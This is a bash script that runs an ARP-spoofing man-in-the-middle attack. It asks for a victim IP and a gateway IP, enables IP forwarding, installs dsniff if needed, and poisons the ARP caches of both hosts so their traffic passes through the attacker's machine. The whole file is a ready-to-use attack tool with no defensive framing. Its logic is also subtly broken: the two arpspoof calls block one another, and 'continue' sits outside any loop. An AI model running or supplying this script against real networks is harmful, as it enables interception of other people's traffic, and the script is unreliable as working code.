#!/bin/bash

exitprog(){
	echo 0 > /proc/sys/net/ipv4/ip_forward
	killall arpspoof &> /dev/null
	echo -e "\e[32mExiting...\e[0m"
	sleep 1
	exit 0
}
exitfunc(){
	echo "Installing has a problem."
	echo "Check your internet connection..."
	echo "Exiting..."
	sleep 1
	exit 0
}
trap exitprog SIGINT  
if [ $UID -ne 0 ] 
then
	echo -e "\e[31mRun this script with root access!!\e[0m"
	exit
fi

check(){
which arpspoof &> /dev/null
if [ $? -ne 0 ] 
then
	echo -ne "Binary file used for arpspoofing is not found..."
	echo -ne "If you want to install, connect your pc with internet.Do you want to install it(Y/N):" && read ans
	if [ $ans == "Y" ] || [ $ans == "y" ] 
	then
		echo "Installing..."
		sudo dnf install dsniff &> /dev/null || sudo apt-get install dsniff &> /dev/null 
		test $? -eq 0 && continue || exitfunc
	elif [ $ans == "N" ] || [ $ans == "n" ]
	then
		echo "Thanks.."
		exit 0
	else
		exit 0
	fi
fi
}

main(){
check
echo -ne "\e[31mEnter Victim IP:\e[0m" && read victip
echo -ne "\e[31mEnter Gateway IP:\e[0m" && read gateip
echo 1 > /proc/sys/net/ipv4/ip_forward 

arpspoof -t $victip $gateip &> /dev/null
arpspoof -t $gateip $victip &> /dev/null
}

main

